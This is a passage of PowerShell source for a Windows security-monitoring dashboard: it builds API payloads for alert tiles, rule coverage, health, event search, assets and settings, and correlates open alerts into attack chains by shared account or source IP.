  $delta = [PSCustomObject]@{ openAlerts = 0; critical = 0; high = 0; eventsLastHour = 0; hostsSeen = 0 }
  if ($prevTiles) {
    $delta.openAlerts = [int]$tiles.openAlerts - [int]$prevTiles.openAlerts
    $delta.critical = [int]$tiles.critical - [int]$prevTiles.critical
    $delta.high = [int]$tiles.high - [int]$prevTiles.high
    $delta.eventsLastHour = [int]$tiles.eventsLastHour - [int]$prevTiles.eventsLastHour
    $delta.hostsSeen = [int]$tiles.hostsSeen - [int]$prevTiles.hostsSeen
  } elseif ($keys.Count -eq 1) {
    $delta.eventsLastHour = [int]$tiles.eventsLastHour
  }

  # coverage = rules CONFIRMED able to fire, from the existing audit preflight.
  # A rule whose audit state could not be read is unverified, not working:
  # counting unknown as working is exactly how a blind deployment reports 100%.
  $rules = @(Get-RuleCatalog)
  $blind = @($rules | Where-Object { $_.auditState -eq 'blind' })
  $unknown = @($rules | Where-Object { $_.auditState -eq 'unknown' })
  $total = $rules.Count
  $working = $total - $blind.Count - $unknown.Count
  if ($working -lt 0) { $working = 0 }
  $percent = 0
  if ($total -gt 0) { $percent = [int][Math]::Round((100.0 * $working) / $total) }

  $sevCounts = @{ Critical = 0; High = 0; Medium = 0; Low = 0 }
  foreach ($a in $nonSelf) {
    $s = "$($a.Severity)"
    if ($sevCounts.ContainsKey($s)) { $sevCounts[$s] = [int]$sevCounts[$s] + 1 }
  }
  $tacticCounts = @{}
  foreach ($a in $nonSelf) {
    $t = "$($a.Tactic)"
    if (-not $t) { $t = Get-MitreTactic "$($a.Category)" }
    $tacticCounts[$t] = [int]$tacticCounts[$t] + 1
  }

  $hourly = @()
  foreach ($k in $keys) {
    $b = $Script:ObsHours[$k]
    $hourly += [PSCustomObject]@{
      hour   = $b.hour
      events = [int]$b.events
      alerts = [int]$b.alertSev['Critical'] + [int]$b.alertSev['High'] + [int]$b.alertSev['Medium'] + [int]$b.alertSev['Low']
    }
  }

  $catch = Get-CatchUpState $Script:LagSeconds
  $blindCount = $blind.Count
  $unknownCount = $unknown.Count
  $healthState = 'ok'
  if ($blindCount -gt 0) { $healthState = 'blind' }
  elseif ($unknownCount -gt 0 -or $catch.catchingUp -or $Script:EvalErrors -gt 0 -or $Script:LagSeconds -gt 120) { $healthState = 'degraded' }
  # EVERY reason that applies, worst first - the pill shows the worst and puts
  # all of them in its tooltip, so an amber pill always says why
  $reasons = @()
  if ($blindCount -gt 0) {
    $noun = if ($blindCount -eq 1) { 'family' } else { 'families' }
    $reasons += [PSCustomObject]@{ code = 'blind'; label = 'Blind rules'
      detail = "$blindCount rule $noun cannot fire - Windows is not writing their events" }
  }
  if ($unknownCount -gt 0) {
    $noun = if ($unknownCount -eq 1) { 'family is' } else { 'families are' }
    $noLog = @($unknown | Where-Object { "$($_.auditDetail)" -like 'log not present*' }).Count
    $detail = if ($noLog -gt 0 -and $noLog -lt $unknownCount) {
      "$noLog rule $noun on a log this OS does not have and $($unknownCount - $noLog) could not be verified - the audit policy was unreadable"
    } elseif ($noLog -gt 0) {
      "$noLog rule $noun on a log this OS does not have, so it cannot be confirmed"
    } else {
      "the audit policy could not be read, so $unknownCount rule $noun unverified"
    }
    $reasons += [PSCustomObject]@{ code = 'unverified'; label = 'Unverified'; detail = $detail }
  }
  if ($catch.catchingUp) {
    $reasons += [PSCustomObject]@{ code = 'catching-up'; label = 'Catching up'
      detail = "the poller is $Script:LagSeconds s behind the oldest channel" }
  }
  if ($Script:LagSeconds -gt 120) {
    $reasons += [PSCustomObject]@{ code = 'lag'; label = 'Poll lag'
      detail = "$Script:LagSeconds s behind the newest events" }
  }
  if ($Script:EvalErrors -gt 0) {
    $reasons += [PSCustomObject]@{ code = 'eval-errors'; label = 'Skipped events'
      detail = "$Script:EvalErrors event(s) failed to evaluate and were skipped" }
  }

  return [PSCustomObject]@{
    tiles = [PSCustomObject]@{
      openAlerts = [int]$tiles.openAlerts
      critical   = [int]$tiles.critical
      high       = [int]$tiles.high
      eventsLastHour = [int]$tiles.eventsLastHour
      hostsSeen  = [int]$tiles.hostsSeen
    }
    deltas = $delta
    coverage = [PSCustomObject]@{
      percent      = $percent
      rulesTotal   = $total
      rulesWorking = $working
      rulesBlind   = $blindCount
      rulesUnknown = $unknownCount
      blindRules   = @($blind | ForEach-Object { [PSCustomObject]@{ id = $_.key; name = $_.title; reason = $_.auditDetail } })
      unknownRules = @($unknown | ForEach-Object { [PSCustomObject]@{ id = $_.key; name = $_.title; reason = $_.auditDetail } })
    }
    severityCounts = $sevCounts
    tacticCounts   = $tacticCounts
    hourly         = $hourly
    lastPoll = [PSCustomObject]@{ lagSeconds = [int]$Script:LagSeconds; catchingUp = $catch.catchingUp; capped = $catch.capped }
    health  = [PSCustomObject]@{ state = $healthState; reasons = $reasons }
    version = $Script:SentinelVersion
    demoData = [bool]$Script:DemoData
  }
}

# Reads one query-string value without ever throwing on a missing key or a
# missing collection (indexing $null is an error in PowerShell).
function Get-QueryValue($query, [string]$name) {
  if ($null -eq $query) { return '' }
  try {
    $v = $query[$name]
    if ($null -eq $v) { return '' }
    return "$v"
  } catch {
    return ''
  }
}

# /api/events - newest first, validated filters, plain substring search
function Get-EventsPayload($query) {
  $limit = 100
  $rawLimit = Get-QueryValue $query 'limit'
  if ($rawLimit) {
    $parsed = 0
    if ([int]::TryParse($rawLimit, [ref]$parsed)) {
      if ($parsed -gt 0) { $limit = $parsed }
      if ($limit -gt $Script:MaxObsEvents) { $limit = $Script:MaxObsEvents }
    }
  }
  $filterId = Get-QueryValue $query 'eventId'
  $badId = $false
  if ($filterId) { if ($filterId -notmatch '^\d{1,10}$') { $badId = $true } }
  $filterHost = Get-QueryValue $query 'host'
  $filterUser = Get-QueryValue $query 'user'
  $filterQ = Get-QueryValue $query 'q'
  if ($filterHost.Length -gt 120) { $filterHost = $filterHost.Substring(0, 120) }
  if ($filterUser.Length -gt 120) { $filterUser = $filterUser.Substring(0, 120) }
  if ($filterQ.Length -gt 120) { $filterQ = $filterQ.Substring(0, 120) }

  # [object[]] cast, not @(...): wrapping a generic List directly with the array
  # subexpression operator is unreliable (it throws "Argument types do not match"
  # on some hosts), and the cast behaves identically on 5.1 and 7.
  $rows = [object[]]$Script:ObsEvents
  if ($badId) {
    return [PSCustomObject]@{ error = 'eventId must be digits.'; status = 400; events = @(); count = 0; total = 0; limit = $limit }
  }
  if ($filterId) { $rows = @($rows | Where-Object { $_.eventId -eq $filterId }) }
  if ($filterHost) { $rows = @($rows | Where-Object { "$($_.host)".ToLower() -eq $filterHost.ToLower() }) }
  if ($filterUser) { $rows = @($rows | Where-Object { "$($_.user)".ToLower() -eq $filterUser.ToLower() }) }
  if ($filterQ) {
    # plain substring, never a regular expression (a filter is not code)
    $needle = $filterQ.ToLower()
    $rows = @($rows | Where-Object {
      ("$($_.summary)".ToLower().Contains($needle)) -or
      ("$($_.host)".ToLower().Contains($needle)) -or
      ("$($_.user)".ToLower().Contains($needle)) -or
      ("$($_.eventId)".ToLower().Contains($needle))
    })
  }
  $total = $rows.Count
  $newest = @($rows | Sort-Object time -Descending)
  if ($newest.Count -gt $limit) { $newest = @($newest | Select-Object -First $limit) }
  return [PSCustomObject]@{ events = $newest; count = $newest.Count; total = $total; limit = $limit }
}

function Get-HostsPayload {
  # busiest first: alerts dominate, events break the tie (PowerShell cannot sort
  # one key ascending and the next descending in a single pass)
  return @($Script:ObsHosts.Values |
    Sort-Object -Property @{ e = { ([int]$_.alertCount * 1000000) + [int]$_.eventCount } } -Descending)
}

function Get-SettingsPayload {
  # READ-ONLY, and deliberately narrow: names and dates, never a credential. The
  # forwarding key, the password hashes, the salts and the session ids have no
  # path into this object.
  $users = @()
  $store = Get-UserStore
  if ($store -and $store.users) {
    foreach ($u in @($store.users)) {
      # the store keeps ISO-8601, but ConvertFrom-Json turns it into a DateTime and
      # "$(...)" would then print it in the server's locale - keep it ISO
      $created = "$($u.created)"
      try { $created = ([datetime]$u.created).ToUniversalTime().ToString("o") } catch { }
      $users += [PSCustomObject]@{ user = "$($u.user)"; created = $created }
    }
  }
  $fwdHost = ''
  if ($ForwardUrl) { try { $fwdHost = ([uri]$ForwardUrl).Host } catch { $fwdHost = '' } }
  $pre = Get-PreflightReport
  return [PSCustomObject]@{
    version      = $Script:SentinelVersion
    pollSeconds  = $PollSeconds
    bind         = "$Bind"
    port         = $Port
    sessionHours = $Script:SessionHours
    idleMinutes  = $Script:IdleMinutes
    rateLimit    = [PSCustomObject]@{
      maxLoginFailures = $Script:MaxLoginFailures
      windowMinutes    = $Script:LoginWindowMinutes
      blockMinutes     = $Script:LoginBlockMinutes
      maxBodyStalls    = $Script:MaxBodyStalls
      bodyReadMs       = $Script:BodyReadMs
      maxLoginBodyBytes = $Script:MaxLoginBodyBytes
      maxJsonBodyBytes  = $Script:MaxJsonBodyBytes
    }
    forwarding   = [PSCustomObject]@{
      enabled       = [bool]$ForwardUrl
      host          = $fwdHost
      keyConfigured = [bool]$ForwardKey
    }
    audit        = [PSCustomObject]@{
      checkedAt   = $pre.checkedAt
      readable    = $pre.readable
      rulesTotal  = $pre.rulesTotal
      okCount     = $pre.okCount
      blindCount  = $pre.blindCount
      unknownCount = $pre.unknownCount
      fix         = @($pre.fix)
      lastChange  = Get-LastAuditChange
      elevated    = (Test-ProcessElevated)
      backups     = (Get-AuditBackups)
    }
    users        = $users
    usersFileState = (Get-UsersFileState).reason
    demoData     = [bool]$Script:DemoData
  }
}

# ---- JSON array serialisation (PS 5.1 has no -AsArray) ----------------------
# Lives here rather than in the web section so the test harness can drive it: it
# is a pure helper, and its empty-collection case is exactly what needs a test.
# PowerShell 5.1 has no ConvertTo-Json -AsArray, so always build the array
# explicitly - a single-element list must still serialise as [ ... ], not { ... }.
function ConvertTo-JsonArray($items) {
  # An empty array RETURNED from a function arrives here as $null (PowerShell
  # enumerates the return value), and @($null) is a one-element array holding
  # $null - which serialised as [null]. Every array the API returns goes through
  # here, so an empty hosts list or alert list is an empty array.
  if ($null -eq $items) { return '[]' }
  $parts = @()
  foreach ($i in @($items)) {
    if ($null -eq $i) { continue }
    $parts += ($i | ConvertTo-Json -Compress -Depth 6)
  }
  return "[" + ($parts -join ",") + "]"
}

# The alert rows the JSON API returns. Fields (the full normalised event kept
# for web forwarding) is deliberately NOT serialised - the dashboard never reads
# it, and re-serialising it for every alert on every 10-second poll of every
# open tab was most of /api/alerts' cost.
function Get-AlertRows {
  # Fields (the full normalised event kept for web forwarding) is still NOT
  # serialised; the drawer gets the bounded contributing-event summaries instead.
  #
  # Tactic / technique / entity are derived from the rule catalogue when the row
  # does not carry them, so an alert restored from history - or a synthetic
  # self-test row - still shows its tactic and entity instead of blanks.
  return @($Script:Alerts | Select-Object Id, Time, RuleKey, Rule, Severity, Title, Mitre,
    @{ n = 'MitreId'; e = { if ($_.MitreId) { "$($_.MitreId)" } elseif ($_.Mitre) { (Get-MitreParts "$($_.Mitre)").id } else { '' } } },
    @{ n = 'MitreName'; e = { if ($_.MitreName) { "$($_.MitreName)" } elseif ($_.Mitre) { (Get-MitreParts "$($_.Mitre)").name } else { '' } } },
    @{ n = 'Tactic'; e = {
        if ($_.Tactic) { "$($_.Tactic)" }
        elseif ($_.RuleKey -and $RuleMeta[$_.RuleKey]) { Get-MitreTactic "$($RuleMeta[$_.RuleKey].Category)" }
        else { '' } } },
    @{ n = 'Entity'; e = { if ($_.Entity) { "$($_.Entity)" } elseif ($_.Account) { "$($_.Account)" } else { "$($_.Host)" } } },
    Remediation, Description, Host, Account, SourceIp,
    EventId, Acknowledged, Status, Notes, SelfTest,
    @{ n = 'FirstSeen'; e = { if ($_.FirstSeen) { "$($_.FirstSeen)" } else { "$($_.Time)" } } },
    @{ n = 'LastSeen'; e = { if ($_.LastSeen) { "$($_.LastSeen)" } else { "$($_.Time)" } } },
    @{ n = 'Count'; e = { if ($_.Count) { [int]$_.Count } else { 1 } } },
    Events)
}


# ============================================================
# ASSETS - hosts, accounts and source addresses seen in the window
# ============================================================
# Derived ONLY from the observability state the poller already collects (the
# hosts-seen map, the events ring buffer, the alert list) - no new parsing, no
# raw message bodies, no secrets, and no invented risk scores. Everything is
# in-memory and resets with the process.
$Script:AssetIp = @{}           # normalised ip -> @{ firstSeen; lastSeen; accounts; hosts; failedLogons; alertCount; maxSeverity }

# Test-InternalIp as a plain function (no classes): RFC1918, loopback, link-local
function Test-InternalIp([string]$Ip) {
  if (-not $Ip) { return $false }
  $v = "$Ip".Trim()
  if ($v -eq '-' -or $v -eq '') { return $false }
  if ($v -match '^::1$|^127\.' -or $v -match '^::ffff:127\.') { return $true }                 # loopback
  if ($v -match '^fe80:' -or $v -match '^169\.254\.') { return $true }                          # link-local
  if ($v -match '^::ffff:(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})') {                         # mapped v4
    $o = [int]$Matches[1], [int]$Matches[2], [int]$Matches[3], [int]$Matches[4]
    if ($o[0] -eq 10) { return $true }
    if ($o[0] -eq 192 -and $o[1] -eq 168) { return $true }
    if ($o[0] -eq 172 -and $o[1] -ge 16 -and $o[1] -le 31) { return $true }
    return $false
  }
  if ($v -match '^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$') {
    $o = [int]$Matches[1], [int]$Matches[2], [int]$Matches[3], [int]$Matches[4]
    if ($o[0] -eq 10) { return $true }
    if ($o[0] -eq 192 -and $o[1] -eq 168) { return $true }
    if ($o[0] -eq 172 -and $o[1] -ge 16 -and $o[1] -le 31) { return $true }
    return $false
  }
  # a global IPv6 (not fc00-fdff which is unique-local) - keep it simple: fc/fd are internal
  if ($v -match '^(fc|fd)') { return $true }
  return $false
}

# ' ::ffff:10.0.0.5' -> '10.0.0.5'; lowercase; trimmed
function Get-NormalisedIp([string]$Ip) {
  if (-not $Ip) { return '' }
  $v = "$Ip".Trim().ToLower()
  if ($v -match '^::ffff:(.+)$') { return $Matches[1].Trim('['), '' -join '' }
  return ($v -replace '^\[|\]$', '')
}

$SevScore = @{ Critical = 3; High = 2; Medium = 1; Low = 0 }

function Get-MaxSeverity([string]$current, [string]$candidate) {
  $c = "$current"
  $n = "$candidate"
  if (-not $n) { return $c }
  if (-not $c) { return $n }
  if (-not $SevScore.ContainsKey($n)) { return $c }
  if (-not $SevScore.ContainsKey($c)) { return $n }
  if ($SevScore[$n] -gt $SevScore[$c]) { return $n }
  return $c
}

# Records one observed event into the ip map (called from Add-ObservedEvent).
function Update-IpSeen($fields, [bool]$isAlert) {
  if (-not $fields) { return }
  $raw = "$($fields.sourceIp)"
  if (-not $raw -or $raw -eq '' -or $raw -eq '-') { return }
  $ip = Get-NormalisedIp $raw
  if (-not $ip) { return }
  $now = (Get-Date).ToUniversalTime().ToString("o")
  if (-not $Script:AssetIp.ContainsKey($ip)) {
    $Script:AssetIp[$ip] = [PSCustomObject]@{
      ip = $ip; firstSeen = $now; lastSeen = $now
      accounts = @(); hosts = @()
      failedLogons = 0; alertCount = 0; maxSeverity = ''
    }
  }
  $rec = $Script:AssetIp[$ip]
  $rec.lastSeen = $now
  $u = ConvertTo-AccountName "$($fields.accountName)"
  if (-not $u) { $u = ConvertTo-AccountName "$($fields.subjectUserName)" }
  if ($u) {
    $accs = @($rec.accounts)
    if ($accs -notcontains $u) {
      $accs += $u
      if ($accs.Count -gt 20) { $accs = @($accs | Select-Object -Last 20) }
      $rec.accounts = $accs
    }
  }
  $h = "$($fields.hostname)"
  if ($h) {
    $hosts = @($rec.hosts)
    if ($hosts -notcontains $h) {
      $hosts += $h
      if ($hosts.Count -gt 20) { $hosts = @($hosts | Select-Object -Last 20) }
      $rec.hosts = $hosts
    }
  }
  if ("$($fields.eventId)" -eq '4625') { $rec.failedLogons = [int]$rec.failedLogons + 1 }
  if ($isAlert) {
    $rec.alertCount = [int]$rec.alertCount + 1
  }
}

# The account type is only user vs computer - anything else would be a guess.
function Get-AccountType([string]$Name) {
  if ("$Name".EndsWith('$')) { return 'computer' }
  return 'user'
}

# --- the payloads ----------------------------------------------------------
function Get-AssetMap {
  # hosts come from the observability map; accounts and their flags are derived
  # from the events ring buffer and the (non-self-test) alert list
  $hosts = @{}
  foreach ($h in $Script:ObsHosts.Values) {
    $hosts["$($h.host)"] = [PSCustomObject]@{
      kind = 'host'; name = "$($h.host)"
      firstSeen = "$($h.firstSeen)"; lastSeen = "$($h.lastSeen)"
      eventCount = [int]$h.eventCount; alertCount = [int]$h.alertCount
      maxSeverity = ''
      users = @($h.users); ips = @($h.ips)
      openAlerts = @(); tactics = @()
    }
  }
  $accounts = @{}
  $eventsByAccount = @{}
  foreach ($e in $Script:ObsEvents) {
    $u = ConvertTo-AccountName "$($e.user)"
    if (-not $u) { continue }
    if (-not $eventsByAccount.ContainsKey($u)) { $eventsByAccount[$u] = @() }
    $eventsByAccount[$u] += $e
  }
  $alertsByAccount = @{}
  foreach ($a in $Script:Alerts) {
    $u = ConvertTo-AccountName "$($a.Account)"
    if ($u -and -not $alertsByAccount.ContainsKey($u)) { $alertsByAccount[$u] = @() }
    if ($u) { $alertsByAccount[$u] += $a }
  }
  foreach ($u in $eventsByAccount.Keys) {
    $evs = @($eventsByAccount[$u])
    $last = $evs | Sort-Object time -Descending | Select-Object -First 1
    $rec = [PSCustomObject]@{
      kind = 'account'; name = $u
      type = Get-AccountType $u
      firstSeen = "$($evs | Sort-Object time | Select-Object -First 1 | ForEach-Object { $_.time })"
      lastSeen  = "$($last.time)"
      hosts = @()
      ips = @()
      alertCount = 0; maxSeverity = ''
      lastEventIds = @($evs | Sort-Object time -Descending | Select-Object -First 10 | ForEach-Object { "$($_.eventId)" })
      flags = @()
    }
    $seenHosts = @(); $seenIps = @()
    foreach ($e in $evs) {
      if ("$($e.host)" -and $seenHosts -notcontains "$($e.host)") { $seenHosts += "$($e.host)" }
      $ip = Get-NormalisedIp "$($e.sourceIp)"
      if ($ip -and $seenIps -notcontains $ip) { $seenIps += $ip }
    }
    if ($seenHosts.Count -gt 20) { $seenHosts = @($seenHosts | Select-Object -Last 20) }
    if ($seenIps.Count -gt 20) { $seenIps = @($seenIps | Select-Object -Last 20) }
    $rec.hosts = $seenHosts
    $rec.ips = $seenIps
    $accounts[$u] = $rec
  }
  # fold the alerts into every kind
  foreach ($a in $Script:Alerts) {
    if ($a.SelfTest) { continue }
    $sev = "$($a.Severity)"
    $tactic = if ($a.Tactic) { "$($a.Tactic)" } else { Get-MitreTactic "$($a.Category)" }
    $h = "$($a.Host)"
    if ($h -and $hosts.ContainsKey($h)) {
      # alertCount itself is incremented by Update-HostSeen when the alert is
      # raised (Add-ObservedAlert); counting it here TOO doubled it (22 for 11).
      # This fold only enriches the row: worst severity, tactics, open ids.
      $hosts[$h].maxSeverity = Get-MaxSeverity $hosts[$h].maxSeverity $sev
      $tacs = @($hosts[$h].tactics)
      if ($tacs -notcontains $tactic) { $tacs += $tactic }
      $hosts[$h].tactics = $tacs
      if ($a.Status -eq 'New' -or $a.Status -eq 'Investigating' -or -not $a.Status) {
        $open = @($hosts[$h].openAlerts)
        $open += [int]$a.Id
        if ($open.Count -gt 20) { $open = @($open | Select-Object -Last 20) }
        $hosts[$h].openAlerts = $open
      }
    }
    $u = ConvertTo-AccountName "$($a.Account)"
    if ($u -and $accounts.ContainsKey($u)) {
      $accounts[$u].alertCount = [int]$accounts[$u].alertCount + 1
      $accounts[$u].maxSeverity = Get-MaxSeverity $accounts[$u].maxSeverity $sev
      # flags come ONLY from fired rules - a description fragment is evidence,
      # an invented risk score is not
      $flag = $null
      if ("$($a.RuleKey)" -eq 'privilege_escalation') { $flag = 'added to privileged group' }
      elseif ("$($a.RuleKey)" -eq 'asrep_roasting') { $flag = 'AS-REP roastable change' }
      elseif ("$($a.RuleKey)" -eq 'account_control_changed' -and "$($a.Description)" -match 'pre-authentication') { $flag = 'AS-REP roastable change' }
      elseif ("$($a.RuleKey)" -eq 'account_created') { $flag = 'account created' }
      elseif ("$($a.RuleKey)" -eq 'account_deleted') { $flag = 'account deleted' }
      elseif ("$($a.RuleKey)" -eq 'password_reset_by_admin') { $flag = 'password reset by admin' }
      elseif ("$($a.RuleKey)" -eq 'kerberoasting') { $flag = 'kerberoastable ticket requested' }
      elseif ("$($a.RuleKey)" -eq 'account_lockout_storm' -or "$($a.RuleKey)" -eq 'brute_force_single_account') { $flag = 'brute-forced' }
      elseif ("$($a.RuleKey)" -eq 'suspicious_remote_logon') { $flag = 'remote logon' }
      elseif ("$($a.RuleKey)" -eq 'dcsync_replication') { $flag = 'directory replication' }
      elseif ("$($a.RuleKey)" -eq 'log_tampering') { $flag = 'log tampering' }
      if ($flag) {
        $fl = @($accounts[$u].flags)
        if ($fl -notcontains $flag) { $fl += $flag }
        if ($fl.Count -gt 10) { $fl = @($fl | Select-Object -Last 10) }
        $accounts[$u].flags = $fl
      }
    }
    $ip = Get-NormalisedIp "$($a.SourceIp)"
    if ($ip -and $Script:AssetIp.ContainsKey($ip)) {
      # as with hosts: Update-IpSeen already counted the alert; doubling it here
      # made an IP with 3 alerts report 6. Severity still enriches the row.
      $Script:AssetIp[$ip].maxSeverity = Get-MaxSeverity $Script:AssetIp[$ip].maxSeverity $sev
    }
  }
  $ips = @{}
  foreach ($k in $Script:AssetIp.Keys) {
    $r = $Script:AssetIp[$k]
    $ips[$k] = [PSCustomObject]@{
      kind = 'ip'; address = $k
      firstSeen = "$($r.firstSeen)"; lastSeen = "$($r.lastSeen)"
      accounts = @($r.accounts); hosts = @($r.hosts)
      failedLogons = [int]$r.failedLogons
      alertCount = [int]$r.alertCount
      internal = Test-InternalIp $k
      maxSeverity = "$($r.maxSeverity)"
    }
  }
  return @{ hosts = $hosts; accounts = $accounts; ips = $ips }
}

function Get-AssetsPayload($query) {
  $kind = Get-QueryValue $query 'kind'
  if (-not $kind) { $kind = 'host' }
  if ($kind -notin @('host', 'account', 'ip')) {
    return [PSCustomObject]@{ error = 'kind must be host, account or ip.'; status = 400 }
  }
  $limit = 200
  $rawLimit = Get-QueryValue $query 'limit'
  if ($rawLimit) {
    $parsed = 0
    if ([int]::TryParse($rawLimit, [ref]$parsed)) {
      if ($parsed -gt 0) { $limit = $parsed }
      if ($limit -gt 500) { $limit = 500 }
    }
  }
  $q = Get-QueryValue $query 'q'
  if ($q.Length -gt 120) { $q = $q.Substring(0, 120) }
  $map = Get-AssetMap
  $rows = @()
  if ($kind -eq 'host') { $rows = @($map.hosts.Values) }
  elseif ($kind -eq 'account') { $rows = @($map.accounts.Values) }
  else { $rows = @($map.ips.Values) }
  if ($q) {
    $needle = $q.ToLower()
    $rows = @($rows | Where-Object {
      $hit = "$($_.name)".ToLower().Contains($needle) -or "$($_.address)".ToLower().Contains($needle)
      if (-not $hit -and $_.users) { $hit = @($_.users | Where-Object { "$_".ToLower().Contains($needle) }).Count -gt 0 }
      if (-not $hit -and $_.accounts) { $hit = @($_.accounts | Where-Object { "$_".ToLower().Contains($needle) }).Count -gt 0 }
      $hit
    })
  }
  $total = $rows.Count
  # busiest first (the map rows are not ordered)
  $rows = @($rows | Sort-Object -Property @{ e = { ([int]$_.alertCount * 1000000) + [int]$_.eventCount } } -Descending)
  if ($rows.Count -gt $limit) { $rows = @($rows | Select-Object -First $limit) }
  return [PSCustomObject]@{ assets = $rows; count = $rows.Count; total = $total; limit = $limit; kind = $kind }
}

function Get-AssetDetail($kind, $id) {
  if ($kind -notin @('host', 'account', 'ip')) {
    return [PSCustomObject]@{ error = 'kind must be host, account or ip.'; status = 400 }
  }
  $map = Get-AssetMap
  $row = $null
  if ($kind -eq 'host') {
    if ($map.hosts.ContainsKey($id)) { $row = $map.hosts[$id] }
  } elseif ($kind -eq 'account') {
    if ($map.accounts.ContainsKey($id)) { $row = $map.accounts[$id] }
  } else {
    $nip = Get-NormalisedIp $id
    if ($map.ips.ContainsKey($nip)) { $row = $map.ips[$nip] }
  }
  if (-not $row) { return [PSCustomObject]@{ error = 'No such asset.'; status = 404 } }
  # the activity timeline: this asset's events from the ring buffer, newest first
  $needle = "$id".ToLower()
  $timeline = @($Script:ObsEvents | Where-Object {
    ("$($_.host)".ToLower() -eq $needle) -or
    (ConvertTo-AccountName "$($_.user)".ToLower()) -eq $needle -or
    (Get-NormalisedIp "$($_.sourceIp)") -eq (Get-NormalisedIp $needle)
  } | Sort-Object time -Descending | Select-Object -First 50)
  return [PSCustomObject]@{ asset = $row; timeline = $timeline }
}



# ============================================================
# ATTACK CHAINS - open alerts that share an entity in time
# ============================================================
# Alerts the analyst resolved (or marked false positive) are EXCLUDED - a chain
# is a live investigation. Alerts are grouped when they share an account OR a
# source ip inside a 60-minute sliding window - sharing only the destination
# host is NOT a link (every alert touching DC01 would be one chain). A chain
# needs at least two alerts, so single alerts stay out, and an alert with
# neither an account nor a source ip stays out too. Deterministic: the same set
# of alerts always produces the same chains and the same ids.
$Script:ChainWindowMinutes = 60
$Script:ChainTactics = @('Initial Access', 'Execution', 'Persistence', 'Privilege Escalation',
  'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement',
  'Collection', 'Exfiltration', 'Impact')
$Script:MaxChains = 50

function Get-ChainId([string]$key) {
  # stable, short, and derived only from the alert ids in the chain
  $md5 = [System.Security.Cryptography.MD5]::Create()
  try {
    $bytes = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($key))
    return (($bytes | Select-Object -First 6 | ForEach-Object { $_.ToString('x2') }) -join '')
  } finally { $md5.Dispose() }
}

function Get-AttackChains {
  $open = @($Script:Alerts | Where-Object {
    -not $_.SelfTest -and "$($_.Status)" -ne 'Resolved' -and "$($_.Status)" -ne 'False Positive'
  })
  $parsed = @()
  foreach ($a in $open) {
    $when = $null
    try { $when = [datetime]::Parse("$($a.Time)").ToUniversalTime() } catch { $when = $null }
    if (-not $when) { continue }
    $parsed += [PSCustomObject]@{
      Alert = $a; When = $when
      Account = ConvertTo-AccountName "$($a.Account)"
      Host = "$($a.Host)"
      Ip = Get-NormalisedIp "$($a.SourceIp)"
      Tactic = if ($a.Tactic) { "$($a.Tactic)" } else { Get-MitreTactic "$($a.Category)" }
    }
  }
  # union-find over shared entities within the window
  $parent = @{}
  foreach ($i in @(0..($parsed.Count - 1))) { $parent[$i] = $i }
  function Find-Root([int]$x) {
    while ($parent[$x] -ne $x) { $parent[$x] = $parent[$parent[$x]]; $x = $parent[$x] }
    return $x
  }
  function Join-Sets([int]$a, [int]$b) {
    $ra = Find-Root $a; $rb = Find-Root $b
    if ($ra -ne $rb) { $parent[$rb] = $ra }
  }
  $window = [timespan]::FromMinutes($Script:ChainWindowMinutes)
  for ($i = 0; $i -lt $parsed.Count; $i++) {
    for ($j = $i + 1; $j -lt $parsed.Count; $j++) {
      $gap = [Math]::Abs(($parsed[$i].When - $parsed[$j].When).TotalMinutes)
      if ($gap -gt $Script:ChainWindowMinutes) { continue }
      # Two alerts are the same story when the same ACCOUNT did both, or when
      # the same SOURCE ADDRESS did both. Sharing only the destination host says
      # nothing: every alert on a DC would merge into one mega-chain. The host
      # stays an entity/label on the chain; it is never the link.
      # Alerts with neither an account nor an ip cannot be tied to anything and
      # stay out (a group of them is not a chain, it is just a host).
      if ($parsed[$i].Account -and $parsed[$i].Account -eq $parsed[$j].Account) { Join-Sets $i $j; continue }
      if ($parsed[$i].Ip -and $parsed[$i].Ip -eq $parsed[$j].Ip) { Join-Sets $i $j }
    }
  }
  $groups = @{}
  for ($i = 0; $i -lt $parsed.Count; $i++) {
    $root = Find-Root $i
    if (-not $groups.ContainsKey($root)) { $groups[$root] = @() }
    $groups[$root] += $parsed[$i]
  }
  $chains = @()
  foreach ($root in $groups.Keys) {
    $members = @($groups[$root] | Sort-Object When)
    if ($members.Count -lt 2) { continue }   # a chain needs at least two alerts
    $accounts = @($members | ForEach-Object { $_.Account } | Where-Object { $_ } | Select-Object -Unique)
    $hosts = @($members | ForEach-Object { $_.Host } | Where-Object { $_ } | Select-Object -Unique)
    $ips = @($members | ForEach-Object { $_.Ip } | Where-Object { $_ } | Select-Object -Unique)
    $sev = ''
    foreach ($m in $members) { $sev = Get-MaxSeverity $sev "$($m.Alert.Severity)" }
    $ids = @($members | ForEach-Object { [int]$_.Alert.Id } | Sort-Object)
    $key = ($ids -join '-')
    $tacticIndexes = @{}
    foreach ($t in @($members | ForEach-Object { $_.Tactic } | Where-Object { $_ } | Select-Object -Unique)) {
      $idx = $Script:ChainTactics.IndexOf($t)
      if ($idx -ge 0) { $tacticIndexes[$idx] = $t }
    }
    $ordered = @($tacticIndexes.Keys | Sort-Object | ForEach-Object { $tacticIndexes[$_] })
    $title = ''
    if ($accounts.Count -gt 0 -and $hosts.Count -gt 0) { $title = "$($accounts[0]) on $($hosts[0])" }
    elseif ($accounts.Count -gt 0) { $title = "$($accounts[0])" }
    elseif ($hosts.Count -gt 0) { $title = "$($hosts[0])" }
    elseif ($ips.Count -gt 0) { $title = "activity from $($ips[0])" }
    else { $title = 'related alerts' }
    $chains += [PSCustomObject]@{
      id = Get-ChainId $key
      title = $title
      entities = [PSCustomObject]@{ accounts = $accounts; hosts = $hosts; ips = $ips }
      firstSeen = $members[0].When.ToUniversalTime().ToString('o')
      lastSeen = $members[$members.Count - 1].When.ToUniversalTime().ToString('o')
      maxSeverity = $sev
      tacticsInOrder = $ordered
      alerts = @($members | ForEach-Object {
        [PSCustomObject]@{
          id = [int]$_.Alert.Id
          title = "$($_.Alert.Title)"
          severity = "$($_.Alert.Severity)"
          tactic = $_.Tactic
          technique = "$($_.Alert.MitreId)"
          time = $_.When.ToUniversalTime().ToString('o')
        }
      })
    }
  }
  # most severe first, then newest; capped
